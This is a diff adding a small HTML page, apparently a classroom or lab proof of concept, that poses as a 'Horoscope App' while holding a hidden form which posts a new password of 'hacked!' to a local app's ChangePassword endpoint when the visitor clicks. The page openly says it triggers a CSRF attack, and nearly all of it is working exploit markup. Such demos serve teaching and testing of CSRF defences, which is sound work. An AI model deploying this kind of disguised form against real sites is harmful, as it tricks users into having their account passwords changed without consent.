@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width">
+    <title>Horoscope App</title>
+</head>
+<body>
+    <div>
+        <h2>Check your daily horoscope here:</h2>
+        <form action="https://localhost:5001/Profile/ChangePassword" method="post">
+            <input type="hidden" name="newPass" value="hacked!">
+            <input type="hidden" name="newPassConfirm" value="hacked!">
+            <input type="submit" value="Click">
+        </form>
+        <p>Click on the button to <b>trigger the CSRF attack</b>.</p>
+    </div>
+</body>
+</html>
